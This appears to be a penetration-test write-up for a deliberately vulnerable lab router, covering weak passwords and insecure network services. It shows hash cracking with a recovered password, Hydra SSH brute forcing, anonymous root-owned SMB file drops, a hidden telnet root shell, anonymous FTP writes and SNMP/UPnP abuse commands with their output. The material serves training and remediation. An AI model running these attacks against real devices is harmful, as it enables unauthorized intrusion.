---
id: "ROUTCOON-IOT"
title: "RoutCoon Router IoT Vulnerabilities (OWASP IoT Top 10 2018)"
category: IoT
status: DONE
severity: "Critical to Medium (per finding)"
owasp: "OWASP IoT Top 10 (2018): IoT1 Weak/Guessable/Hardcoded Passwords, IoT2 Insecure Network Services, IoT3 Insecure Ecosystem Interfaces, IoT4 Lack of Secure Update Mechanism, IoT5 Use of Insecure or Outdated Components, IoT6 Insufficient Privacy Protection, IoT7 Insecure Data Transfer and Storage, IoT8 Lack of Device Management, IoT9 Insecure Default Settings, IoT10 Lack of Physical Hardening"
cwe:
  - "CWE-521 Weak Password Requirements, CWE-798 Use of Hard-coded Credentials (IoT1)"
  - "CWE-319 Cleartext Transmission, CWE-306 Missing Authentication for Critical Function, CWE-1188 Insecure Default Initialization of Resource (IoT2)"
  - "CWE-284 Improper Access Control, CWE-200 Exposure of Sensitive Information (IoT3)"
  - "CWE-347 Improper Verification of Cryptographic Signature, CWE-494 Download of Code Without Integrity Check (IoT4)"
  - "CWE-1104 Use of Unmaintained Third Party Components, CWE-489 Active Debug Code (IoT5)"
  - "CWE-359 Exposure of Private Personal Information (IoT6)"
  - "CWE-319 Cleartext Transmission, CWE-312 Cleartext Storage of Sensitive Information (IoT7)"
  - "CWE-778 Insufficient Logging, CWE-1277 Firmware Not Updateable (IoT8)"
  - "CWE-1188 Insecure Default Initialization of Resource, CWE-250 Execution with Unnecessary Privileges (IoT9)"
  - "CWE-1263 Improper Physical Access Control (IoT10)"
affected_components:
  - "labs/routcoon/files/usr/lib/vulnzoo-hooks/profile-init.d/11-add-users.sh"
  - "labs/routcoon/files/usr/lib/vulnzoo-hooks/profile-init.d/20-dropbear.sh"
  - "labs/routcoon/rshell.c"
  - "labs/routcoon/files/etc/init.d/ftpd"
  - "labs/routcoon/files/etc/snmp/snmpd.conf"
  - "labs/routcoon/files/etc/config/upnpd"
  - "labs/routcoon/files/etc/dnsmasq.conf.reference"
  - "labs/routcoon/files/usr/lib/vulnzoo-hooks/profile-init.d/60-dnsmasq.sh"
  - "labs/routcoon/files/etc/opkg.conf"
  - "labs/routcoon/files/opt/oem-updates/scripts/auto-updater.sh"
  - "labs/routcoon/files/usr/lib/lua/luci/controller/support/remote.lua"
  - "labs/routcoon/files/usr/lib/vulnzoo-hooks/profile-init.d/88-routcoon-wifi-ap.sh"
findings:
  - "IoT1: DONE"
  - "IoT2: DONE (wireless AP + PSK crack, DHCP/DNS folded into UCI, Samba anonymous root-write share, telnet/FTP/SNMP/UPnP all verified live)"
  - "IoT3: DONE"
  - "IoT4: DONE"
  - "IoT5: DONE (support/remote unauth SSH-key injection -> root SSH verified live, RC-V2)"
  - "IoT6: DONE"
  - "IoT7: DONE (cleartext HTTP :80 self-evident; /tmp leasefile tamper + DNS-history-in-syslog verified live, RC-V2/RC-V6)"
  - "IoT8: DONE"
  - "IoT9: DONE"
  - "IoT10: DONE"
---

# IoT:I1 - Weak Guessable, or Hardcoded Passwords
## Definition
> Use of easily bruteforced, publicly available, or unchangeable credentials, including backdoors in firmware or client software that grants unauthorized access to deployed systems.
## Description
By downloading the firmware and extracting it using [binwalk](https://github.com/ReFirmLabs/binwalk) the hashes from users can be obtained.

> Use *"binwalk -ev openwrt.img"* to extract firmware. (You can use the image storaged at /vulnzoo/releases or use your own compiled image).

```shell
❯ grep -Ri "pwned" /usr/share/wordlists/rockyou.txt
pwned5
lawlpwned1
wtfpwned1
ugotpwned
timpwnedj00
pwnedyou
pwnedftwha4
pwned<3wfuzz_breaks_openwrtuser_password
pwned69
pwned1
pwned00
pwned!
pwned
omgpwned
haiwinpwned
ericpwned
bxrpwned16
Asianspwned
808pwned
```

The `pwned` substring is the tell for `openwrtuser`, not `root`. The `openwrtuser` password is the username with a `pwned`-family suffix, so a wordlist built from that pattern recovers it. The `root` hash is a decoy: its password is `uncrackable`, which the `pwned` wordlists do not contain, so `john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt` against the `root` hash exhausts the list with no result. Cracking is therefore the path into `openwrtuser`, while `root` is reached later by escalating from `openwrtuser` (see [[#IoT:I9 - Insecure Default Settings|IoT9]]), not by breaking its hash.

The password for the user `openwrtuser` can be obtained using the **Combination** attack mode. With this type of attack, a combination from a list is performed.

```zsh
❯ hashcat -m 7400 -a 1 hash.txt user.txt /usr/share/wordlists/modified.txt --show
$5$ULxTq2Kzw066TUtC$Os/H7sHKmk9HXOz7hpyADUEbXn6NG2UAD6DxZGOQB5B:openwrtuserpwned
```

Another way to obtain the password for the `openwrtuser` user is through the administration interface. This displays a login panel when accessed. The `root` user is the only one allowed to access and change the router settings, but the system first validates whether the password entered matches the one the device has referenced for the user being entered, and then checks whether it is the authorized `root` user. For this reason, we can obtain the user password by brute force.

Using an incorrect password returns a 403 Forbidden error.

![[api1_root_invalid_login.png]]

If we use an existing user on the device, we cannot gain access, but we do obtain different codes when the password is correct.

![[api1_openwrtuser_invalid_login.png]]

![[api1_openwrtuser_login_401.png]]

This may allow the password to be obtained through a brute force process. I generated a user using a Python script that allowed me to generate mutated passwords with the user name and the suffix “pwned,” which generated a wordlist with the valid password. You can also use the “John The Reaper” option shown above.

![[api1_mutated_passwords.png]]
![[api1_wfuzz_openwrtuser_passwords.png]]

# IoT:I2 - Insecure Network Servicies
## Definition
> Unneeded or insecure network services running on the device itself, especially those exposed to the internet, that compromise the confidentiality, integrity/authenticity, or availability of information or allow unauthorized remote control ...
## Description
```shell
$ nmap -p- 192.168.1.1
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-18 11:43 CEST
Nmap scan report for 192.168.1.1
Host is up (0.0086s latency).
Not shown: 65527 closed tcp ports (conn-refused)
PORT     STATE    SERVICE
21/tcp   open     ftp
22/tcp   open     ssh
53/tcp   open     domain
80/tcp   open     http
445/tcp  open     microsoft-ds
3702/tcp open     ws-discovery
5515/tcp filtered unknown
5355/tcp open     llmnr
```
### 2.1 SSH (Secure Shell) port 22
```shell
$ nmap -p22 -sC -sV 192.168.1.1
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-18 11:45 CEST
Nmap scan report for 192.168.1.1
Host is up (0.00072s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     Dropbear sshd (protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

$ nmap --script ssh-auth-methods -p 22 192.168.2.1 
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-05 13:26 +0100
Nmap scan report for vulnzoo.com (192.168.2.1)
Host is up (0.00048s latency).

PORT   STATE SERVICE
22/tcp open  ssh
| ssh-auth-methods: 
|   Supported authentication methods: 
|     publickey
|_    password
MAC Address: B8:27:EB:79:53:C3 (Raspberry Pi Foundation)

Nmap done: 1 IP address (1 host up) scanned in 0.29 seconds
```

If you try to log in via SSH with cracked credentials, the result will be the same. The router doesn't implement any security mechanisms to prevent brute force attacks via the SSH service. This is similar to what is seen in [[#IoT:I1 - Weak Guessable, or Hardcoded Passwords]]

```zsh
$ hydra -l openwrtuser -P ./mutated.txt ssh://192.168.2.1 -t 4 -V 
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-03-05 13:28:05
[DATA] max 4 tasks per 1 server, overall 4 tasks, 1023 login tries (l:1/p:1023), ~256 tries per task
[DATA] attacking ssh://192.168.2.1:22/
[ATTEMPT] target 192.168.2.1 - login "openwrtuser" - pass "808pwnedOPENWRTUSER" - 1 of 1023 [child 0] (0/0)
[ATTEMPT] target 192.168.2.1 - login "openwrtuser" - pass "808pwnedOpenwrtuser" - 2 of 1023 [child 1] (0/0)
[ATTEMPT] target 192.168.2.1 - login "openwrtuser" - pass "808pwned_OPENWRTUSER" - 3 of 1023 [child 2] (0/0)
[ATTEMPT] target 192.168.2.1 - login "openwrtuser" - pass "808pwned_Openwrtuser" - 4 of 1023 [child 3] (0/0)
[ATTEMPT] target 192.168.2.1 - login "openwrtuser" - pass "808pwned_openwrtuser" - 5 of 1023 [child 0] (0/0)
[ATTEMPT] target 192.168.2.1 - login "openwrtuser" - pass "808pwnedopenwrtuser" - 6 of 1023 [child 1] (0/0)
...
[ATTEMPT] target 192.168.2.1 - login "openwrtuser" - pass "openwrtuseromgpwned2024" - 866 of 1023 [child 0] (0/0)
[ATTEMPT] target 192.168.2.1 - login "openwrtuser" - pass "openwrtuseromgpwned2025" - 867 of 1023 [child 1] (0/0)
[ATTEMPT] target 192.168.2.1 - login "openwrtuser" - pass "openwrtuserpwned" - 868 of 1023 [child 2] (0/0)
[22][ssh] host: 192.168.2.1   login: openwrtuser   password: openwrtuserpwned
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-03-05 13:29:40
```

### 2.2 Samba (anonymous SMB share)
> **DONE (RC-V2).** Verified end to end on a cold-boot reflash, no manual intervention: `smbclient -L //192.168.2.1 -N` lists the `public` share (Samba 4.18.8) and an anonymous `put` writes a file that lands root-owned in `/mnt/sdcard/share` (`pwned2.txt`, owner `root`, from `force user = root`). At boot the hook `80-routcoon-services.sh` first stands down two competing SMB servers that otherwise grab `:445` with an empty config (the `samba4` package's own procd service, and the kernel `ksmbd` server that was also installed), so our `smbd -s /etc/samba/samba.conf` owns `:445` and serves the vulnerable share.

The device serves an unauthenticated, world-writable SMB share whose writes land as root (`/etc/samba/samba.conf`):

```ini
[global]
	workgroup = WORKGROUP
	map to guest = bad user
	guest account = root
	server min protocol = NT1

[public]
	path = /mnt/sdcard/share
	read only = no
	guest ok = yes
	force user = root
```

`80-routcoon-services.sh` starts `smbd -s /etc/samba/samba.conf` (the `samba4-server` package, now enabled in `.config`). `map to guest = bad user` lets any anonymous client in, and the `[public]` share's `guest ok = yes` + `read only = no` + `force user = root` means an unauthenticated attacker reads and writes files that are created as root:

```shell
# list shares, no credentials
smbclient -L //192.168.2.1 -N
# connect and drop a file (lands root-owned in /mnt/sdcard/share)
smbclient //192.168.2.1/public -N -c 'put /etc/hostname pwned.txt; ls'
```

This is an anonymous, root-owned file-drop primitive: chained with any root-run service that reads `/mnt/sdcard/share`, or with write access to a sensitive path, it escalates to RCE or persistence. Remediation: require authentication, drop `guest ok`, and never `force user = root`.

### 2.3 Telnet
The Telnet service is concealed in the sense that it has been configured to use a non-default port. It is located on port 5515. In a general scan, it appears as a filtered port and the running service is not identified; however, by using `nmap` with version detection scripts and flags, it can eventually be discovered.

```shell
$ nmap -p5515 -sV -sC 192.168.2.1 -vvv           
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-20 09:09 +0100
NSE: Loaded 158 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 09:09
Completed NSE at 09:09, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 09:09
Completed NSE at 09:09, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 09:09
Completed NSE at 09:09, 0.00s elapsed
Initiating ARP Ping Scan at 09:09
Scanning 192.168.2.1 [1 port]
Completed ARP Ping Scan at 09:09, 0.04s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 09:09
Completed Parallel DNS resolution of 1 host. at 09:09, 1.00s elapsed
DNS resolution of 1 IPs took 1.00s. Mode: Async [#: 3, OK: 0, NX: 1, DR: 0, SF: 0, TR: 2, CN: 0]
Initiating SYN Stealth Scan at 09:09
Scanning 192.168.2.1 [1 port]
Discovered open port 5515/tcp on 192.168.2.1
Completed SYN Stealth Scan at 09:09, 0.01s elapsed (1 total ports)
Initiating Service scan at 09:09
Scanning 1 service on 192.168.2.1
Completed Service scan at 09:09, 22.04s elapsed (1 service on 1 host)
NSE: Script scanning 192.168.2.1.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 09:09
Completed NSE at 09:09, 2.02s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 09:09
Completed NSE at 09:09, 1.06s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 09:09
Completed NSE at 09:09, 0.00s elapsed
Nmap scan report for 192.168.2.1
Host is up, received arp-response (0.00045s latency).
Scanned at 2026-01-20 09:09:02 CET for 25s

PORT     STATE SERVICE REASON         VERSION
5515/tcp open  telnet? syn-ack ttl 64
| fingerprint-strings: 
|   GenericLines, NULL: 
|     BusyBox v1.36.1 (2025-09-19 21:19:38 UTC) built-in shell (ash)
|   GetRequest: 
|     HTTP/1.0
|     BusyBox v1.36.1 (2025-09-19 21:19:38 UTC) built-in shell (ash)
|     HTTP/1.0
|_    /bin/sh: GET: not found
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port5515-TCP:V=7.98%I=7%D=1/20%Time=696F3824%P=x86_64-pc-linux-gnu%r(NU
SF:LL,59,"\xff\xfd\x01\xff\xfd\x1f\xff\xfb\x01\xff\xfb\x03\r\r\n\r\n\r\nBu
SF:syBox\x20v1\.36\.1\x20\(2025-09-19\x2021:19:38\x20UTC\)\x20built-in\x20
SF:shell\x20\(ash\)\r\n\r\n~\x20#\x20")%r(GenericLines,65,"\xff\xfd\x01\xf
SF:f\xfd\x1f\xff\xfb\x01\xff\xfb\x03\r\r\n\r\n\r\nBusyBox\x20v1\.36\.1\x20
SF:\(2025-09-19\x2021:19:38\x20UTC\)\x20built-in\x20shell\x20\(ash\)\r\n\r
SF:\n~\x20#\x20\r\n~\x20#\x20\r\n~\x20#\x20")%r(GetRequest,9E,"\xff\xfd\x0
SF:1\xff\xfd\x1f\xff\xfb\x01\xff\xfb\x03\r\r\nGET\x20/\x20HTTP/1\.0\r\n\r\
SF:n\r\n\r\nBusyBox\x20v1\.36\.1\x20\(2025-09-19\x2021:19:38\x20UTC\)\x20b
SF:uilt-in\x20shell\x20\(ash\)\r\n\r\n~\x20#\x20GET\x20/\x20HTTP/1\.0\r\n/
SF:bin/sh:\x20GET:\x20not\x20found\r\n~\x20#\x20\r\n~\x20#\x20");
MAC Address: B8:27:EB:79:53:C3 (Raspberry Pi Foundation)

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 09:09
Completed NSE at 09:09, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 09:09
Completed NSE at 09:09, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 09:09
Completed NSE at 09:09, 0.00s elapsed
Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.44 seconds
           Raw packets sent: 2 (72B) | Rcvd: 2 (72B)

❯ telnet -a 192.168.2.1 5515
Trying 192.168.2.1...
Connected to 192.168.2.1.
Escape character is '^]'.



BusyBox v1.36.1 (2025-09-19 21:19:38 UTC) built-in shell (ash)

~ # whoami
root
~ # id
uid=0(root) gid=0(root)
~ # cat /proc/sys/kernel/hostname
OpenWrt
~ # 
```
### 2.4 FTP
FTP service runs on ftpd daemon. If we have a look inside /etc/init.d/ftpd script we will see that it has been used *'A'* option, which allows an "anonymous" log in.

It is also important to note that the FTP service is configured to use "/opt/oem-updates/pending" as the entry or "home" directory (the OEM firmware-update staging area). Anonymous write access to that directory is what makes it dangerous: a root cron job processes and executes whatever lands there (see [[#IoT:I4 - Lack of Secure Update Mechanism|IoT4]]).

```shell
#!/bin/sh /etc/rc.common

START=90
STOP=10

start() {
    echo "[+] Starting busybox ftpd on port 21"
    echo "[+] Anonymous access enabled with write permissions"
    tcpsvd -vE 0.0.0.0 21 ftpd -w -a anonymous /opt/oem-updates/pending &
}

stop() {
    echo "[+] Stopping ftpd"
    killall tcpsvd
    killall ftpd
}
```

We can easily check this out by scanning port 21 and running *"ftp-anon.nse"* script.

```shell
❯ nmap --script=ftp-anon -sV -p21 192.168.2.1
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-28 09:13 CEST
Nmap scan report for 192.168.1.1
Host is up (0.00075s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     BusyBox ftpd (D-Link DCS-932L IP-Cam camera)
|_ftp-bounce: bounce working!
| ftp-syst: 
|   STAT: 
| Server status:
|  TYPE: BINARY
|_Ok
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
Service Info: Device: webcam; CPE: cpe:/h:dlink:dcs-932l

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 0.60 seconds

❯ ftp 192.168.1.1
Connected to 192.168.1.1.
220 Operation successful
Name (192.168.1.1:xxx): anonymous
230 Operation successful
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 
```

### 2.5 SNMP
Net-SNMP has known memory-safety issues over the years (malformed-OID handling, NULL dereferences, and out-of-bounds reads in SET / GET-NEXT requests), but the reproducible, in-scope finding on this device is the configuration, not a specific parser CVE. The agent ships default community strings (`public` read-only, `private` read-write, see 2.5.1) and answers SNMPv1/v2c in cleartext, so anyone on the LAN can enumerate the device with no credentials.

This lab does not pin a specific CVE. The exact net-snmp package version is not asserted here and must be read off the running image (`opkg list-installed | grep snmp`) and checked against current advisories before any version-specific memory-corruption bug is chained. The demonstrable weakness below is the default-community misconfiguration.

We can expose system's information using nmap scripts:

```shell
$ sudo nmap -p161 -sU -sC -sV 192.168.2.1
[sudo] password for user: 
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-06 14:16 +0100
Nmap scan report for vulnzoo.com (192.168.2.1)
Host is up (0.00053s latency).

PORT    STATE SERVICE VERSION
161/udp open  snmp    SNMPv1 server; net-snmp SNMPv3 server (public)
| snmp-sysdescr: Linux OpenWrt 6.6.104 #0 SMP Fri Sep 19 21:19:38 2025 armv7l
|_  System uptime: 1h16m41.05s (460105 timeticks)
| snmp-info: 
|   enterprise: net-snmp
|   engineIDFormat: unknown
|   engineIDData: 38f58227eedbcd6800000000
|   snmpEngineBoots: 1
|_  snmpEngineTime: 1h16m41s
| snmp-interfaces: 
|   lo
|     IP address: 127.0.0.1  Netmask: 255.0.0.0
|     Type: softwareLoopback  Speed: 10 Mbps
|     Traffic stats: 130.54 Kb sent, 130.54 Kb received
|   eth0
|     IP address: 192.168.2.1  Netmask: 255.255.255.0
|     MAC address: b8:27:eb:79:53:c3 (Raspberry Pi Foundation)
|     Type: ethernetCsmacd  Speed: 1 Gbps
|_    Traffic stats: 88.96 Kb sent, 63.48 Kb received
| snmp-netstat: 
|   TCP  0.0.0.0:21           0.0.0.0:0
|   TCP  0.0.0.0:80           0.0.0.0:0
|   TCP  0.0.0.0:8080         0.0.0.0:0
|   TCP  192.168.2.1:22       0.0.0.0:0
|   TCP  192.168.2.1:22       192.168.2.2:59938
|_  UDP  0.0.0.0:161          *:*
MAC Address: B8:27:EB:79:53:C3 (Raspberry Pi Foundation)
Service Info: Host: OpenWrt

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 0.62 seconds
```

#### 2.5.1 Default Community Strings Configuration
The SNMP service is configured with default community strings that are widely known and documented, representing a critical security vulnerability in IoT deployments.

**Vulnerable Configuration (`/etc/snmp/snmpd.conf`):**
```
rocommunity public
rwcommunity private
sysLocation "VulnZoo RoutCoon Lab"
sysContact "admin@vulnzoo.local"
```

**Risk Analysis:**

| Community | Type       | Risk Level   | Description                                                |
| --------- | ---------- | ------------ | ---------------------------------------------------------- |
| `public`  | Read-Only  | **High**     | Allows unauthorized information disclosure to any attacker |
| `private` | Read-Write | **Critical** | Permits configuration changes without authentication       |

**Exploitation Impact:**
1. **Information Disclosure via `public` community:**

An attacker can enumerate the entire device configuration without authentication:

```shell
# Extract system information
snmpwalk -v 2c -c public 192.168.2.1 1.3.6.1.2.1.1

# Enumerate network interfaces and IP addresses
snmpwalk -v 2c -c public 192.168.2.1 1.3.6.1.2.1.2.2

# Extract ARP table (discover connected devices)
snmpwalk -v 2c -c public 192.168.2.1 1.3.6.1.2.1.4.22

# View routing table
snmpwalk -v 2c -c public 192.168.2.1 1.3.6.1.2.1.4.21

# List running processes
snmpwalk -v 2c -c public 192.168.2.1 1.3.6.1.2.1.25.4.2

# Enumerate storage and filesystems
snmpwalk -v 2c -c public 192.168.2.1 1.3.6.1.2.1.25.2.3
```

2. **Network Mapping:**
The extracted ARP table (`1.3.6.1.2.1.4.22`) reveals all devices connected to the router, enabling lateral movement planning:

```
iso.3.6.1.2.1.4.22.1.2.2.192.168.2.2 = Hex-STRING: B8 27 EB 79 53 C4
iso.3.6.1.2.1.4.22.1.2.2.192.168.2.10 = Hex-STRING: AA BB CC DD EE FF
```

3. **Write Access Attempts via `private` community:**
Although modern SNMP agents restrict writable OIDs, the presence of `rwcommunity private` exposes the device to:
- Modification of system contact and location information
- Configuration changes if extended MIBs are enabled
- Potential command execution via SNMP extensions
  
```shell
# Attempt to modify system contact (will fail on restricted views, but demonstrates exposure)
snmpset -v 2c -c private 192.168.2.1 1.3.6.1.2.1.1.4.0 s "compromised@attacker.com"
```

**Attack Chain Integration:**

The SNMP information disclosure vulnerability can be chained with other attacks:

1. **Reconnaissance Phase:** SNMP enumeration provides the attacker with:
	- Operating system version (Linux OpenWrt 6.6.104 armv7l)
	- System uptime (indicates last reboot/patch cycle)
	- Network topology and connected devices
	- Open ports and services (via TCP/UDP connection tables)
2. **Credential Targeting:** The `sysContact` field may contain valid email addresses or usernames that can be used in phishing campaigns or password spraying attacks.
3. **Firmware Vulnerability Correlation:** The exact OS version obtained via SNMP (`iso.3.6.1.2.1.1.1.0`) allows attackers to search for specific CVEs affecting that OpenWrt version.

**Regulatory Compliance Impact:**
This configuration violates multiple security standards:
- **ETSI EN 303 645**: Requirement for unique credentials and secure authentication
- **IEC 62443**: Network segmentation and secure device management
- **EU Cyber Resilience Act**: Lack of security by design

**Remediation:**
Replace default communities with cryptographically random strings:

```

# Secure configuration
rocommunity VulnZooR0utC00nR34d0nly 127.0.0.1/32

# rwcommunity should be disabled or restricted to specific management hosts

# rwcommunity VulnZooWr1t3S3cur3! 192.168.2.100/32

```

Additionally, SNMP should be disabled if not required, or restricted to localhost-only access via firewall rules.
### 2.6 UPNP
The device exposes Universal Plug and Play (UPnP) IGD (Internet Gateway Device) services on the local network interface with security controls disabled. The `secure_mode=no` configuration allows unauthenticated clients to submit port mapping requests, exposing the internal network topology and firewall configuration to manipulation. While the specific port mapping action failed with error 501 (the router has a single NIC, so `miniupnpd` runs with `internal_iface 'lo'` and there is no distinct internal LAN or real WAN to build a NAT forward on), the service accepted and processed the malicious SOAP request without authentication, confirming the vulnerability exists in the configuration layer.


OpenWRT is running miniupnpd and it is listening on port 5000.
```shell
root@OpenWrt:~# netstat -tulnp | grep miniupnpd
tcp        0      0 :::5000                 :::*                    LISTEN      4497/miniupnpd # UPnP HTTP Control
udp        0      0 0.0.0.0:5351            0.0.0.0:*                           4497/miniupnpd # NAT-PMP
udp        0      0 0.0.0.0:1900            0.0.0.0:*                           4497/miniupnpd # SSDP Discovery
udp        0      0 0.0.0.0:50345           0.0.0.0:*                           4497/miniupnpd # SSDP Response Ephemeral
```

*/etc/miniupnpd/miniupnpd.conf*

```shell
ext_ifname=eth0
listening_ip=eth0
port=5000
enable_upnp=yes
enable_natpmp=yes
secure_mode=no
bitrate_down=10240000
bitrate_up=10240000
uuid=05f16a8d-4cc7-4bb1-a894-98ca59bb3ea0
allow 0-65535 192.168.2.0/24 0-65535
deny 0-65535 0.0.0.0/0 0-65535
lease_file=/var/run/miniupnpd.leases
force_igd_desc_v1=yes
```

- `secure-mode=no`: Critical, it allows port mapping to any internal IP. Permits thirds-party redirection.

The authoritative source is the UCI config `/etc/config/upnpd`, which sets `secure_mode '0'` (the flaw) plus a wide-open `perm_rule` (`action 'allow'`, `int_addr '0.0.0.0/0'`, `ext_ports '0-65535'`). It also sets `internal_iface 'lo'` and `external_iface 'eth0'`: because `miniupnpd` refuses to run with the internal and external interface the same and the lab has only `eth0`, the internal side is pinned to loopback. That is the concrete reason `AddPortMapping` returns 501, there is no distinct internal LAN interface to redirect to and no separate WAN to redirect from, so the NAT rule cannot be built. This is a single-NIC topology limit, not a security control: the authorization layer already accepted the unauthenticated request. On a real two-interface router the same `secure_mode '0'` + permissive `perm_rule` lets any unauthenticated LAN client forward attacker-chosen external ports to arbitrary internal hosts.

#### Vulnerability Evidence:
The SSDP multicast discovery successfully identified the router's UPnP services without authentication:

```shell
$ gssdp-discover -i eth0 --timeout=3
resource available
  USN:      uuid:05f16a8d-4cc7-4bb1-a894-98ca59bb3ea0::urn:schemas-upnp-org:device:InternetGatewayDevice:2
  Location: http://192.168.2.1:5000/rootDesc.xml
```

Using the discovered control endpoint, an unauthorized port mapping request was submitted from a non-privileged network position:

```shell
$ upnpc -u http://192.168.2.1:44997/rootDesc.xml -a 192.168.2.2 80 9999 TCP
upnpc: miniupnpc library test client, version 2.3.3.
Found valid IGD : http://192.168.2.1:44997/ctl/IPConn 
Local LAN ip address : 192.168.2.2
ExternalIPAddress = 1.2.3.4
AddPortMapping(9999, 80, 192.168.2.2) failed with code 501 (Action Failed)
```

The HTTP 501 (Action Failed) response **confirms the vulnerability** despite the operational failure:

1. **Request Acceptance:** The SOAP request was accepted and parsed (no 401 Unauthorized or 403 Forbidden).
    
2. **Processing Reached Execution Phase:** The service attempted to execute `AddPortMapping` rather than rejecting it at the authentication/authorization layer.
    
3. **Failure Mode:** The error occurred at the iptables/NAT implementation layer (environmental limitation in lab setup), not at the security policy layer.
    
4. **Information Disclosure:** The response confirmed the spoofed `ExternalIPAddress` (1.2.3.4), revealing the router's perceived WAN identity.

#### **Risk Assessment**

**Attack Scenarios Validated:**

1. **Cross-Device Port Forwarding (Integrity Violation)**  
    An attacker on Host A (192.168.2.100) could theoretically map external ports to Host B (192.168.2.2) without Host B's consent, exposing internal services to external access.
    
2. **Network Topology Reconnaissance (Confidentiality Breach)**  
    The SSDP discovery and XML descriptor exposure reveal network architecture, device capabilities, and potential attack vectors to unauthenticated LAN participants.
    
3. **Firewall Configuration Tampering (Availability Risk)**  
    While the specific mapping failed, the ability to submit arbitrary `DeletePortMapping` or `GetGenericPortMappingEntry` actions could disrupt legitimate network services.

### 2.7 DHCP && DNS

The DHCP/DNS service (dnsmasq) has a number of features that make it vulnerable. It now runs from the UCI config: the monolithic `/etc/dnsmasq.conf`, which hard-coded a `192.168.1.100-254` pool and a `192.168.1.1` gateway against the stock OpenWrt `br-lan` default, is parked as `dnsmasq.conf.reference` and is no longer loaded, so there is no `192.168.1.x` segment on this build.

The lab serves two real subnets:

| Network | Interface | Gateway | DHCP pool |
|---------|-----------|---------|-----------|
| lan (wired) | `eth0` | `192.168.2.1` | `192.168.2.100-249` |
| wlan (the Wi-Fi AP) | `phy0-ap0` | `192.168.3.1` | `192.168.3.100-249` |

Wired clients land on `192.168.2.0/24` and the management surface (LuCI, SSH, SNMP) answers at `192.168.2.1`, the canonical target host. Wireless clients that join the AP land on `192.168.3.0/24` with the router at `192.168.3.1` (see the wireless AP finding, 2.8, below).

#### 1. Service exposure
`interface=br-lan,eth0,wlan0` and `bind-interfaces` allow the service to be accessible from external networks.
#### 2. Configuration files in /tmp
Critical files are stored in the temporary directory, such as `/tmp/dhcp.leases, /tmp/hosts, /tmp/dhcp_events.log`. Any user/process can modify the DHCP/DNS configurations.

Potential vulnerabilities:
- Injection of fake DHCP leases.
- Modification of local DNS resolution.
- Manipulation of logs to hide malicious activity ([[#IoT:I7 - Insecure Data Transfer and Storage]])
- Discovery of other devices on the network, facilitating `pivoting`.
#### 3. Script executed as root (jail-contained on this build)
`dhcp-script=/etc/dnsmasq.script` (set in UCI by `60-dnsmasq.sh`) makes dnsmasq run that script as root on every DHCP event, via the OpenWrt wrapper `/usr/lib/dnsmasq/dhcp-script.sh` which sources it (`. "$USER_DHCPSCRIPT"`). Live verification confirmed the script does execute (logread: `dnsmasq-script[1]: /etc/dnsmasq.script: line 15: date: not found`), but two things blunt it on this build:

- It runs inside dnsmasq's `ujail`, which gives the process a private `/tmp`. The script's writes (`/tmp/dhcp_events.log`, `/tmp/active_hosts.txt`, `/tmp/dns_updates.txt`) land in the jail's `/tmp`, not the host's, so they are not readable by other local users. Only the leasefile is host-visible, because the init bind-mounts it separately. The minimal jail also lacks `date`, so even the log line is degraded.
- The script quotes `$4` (hostname) in every `echo`/`case`, so despite its own warning comment it has **no** working shell injection.

So on the shipped build this is root-context execution with contained side effects, not a usable disclosure or RCE primitive. Making it a live vuln would require removing the jail for dnsmasq and dropping the `$4` quoting (hostname-driven root RCE), a deliberate change tracked separately, not done here.

Related to [[#IoT:I5: Using Insecure or Outdated Components]] and [[#IoT:I7 - Insecure Data Transfer and Storage]].
#### 4. Lack of Rate Limiting
There are no limits on DHCP/DNS requests (`dhcp-rapid-commit` is commented out). This makes the service vulnerable to DoS attacks.

- DHCP Starvation (IP pool).
- DNS amplification.
- Resource exhaustion (CPU/memory).

This is related to the risk [[#IoT:I8 - Lack of device management]].
#### 5. Some configurations that are not recommended
- `stop-dns-rebind` disabled.
- `cache-size=10000` large and without validation.
- `no-negcache` enabled.
- `dhcp-lease-max=100000` too high.
- `dhcp-authoritative` without validation.
- `read-ethers` enabled without protection.
These configurations are insecure and enable possible impacts such as DNS rebinding and DNS Cache Poisoning.
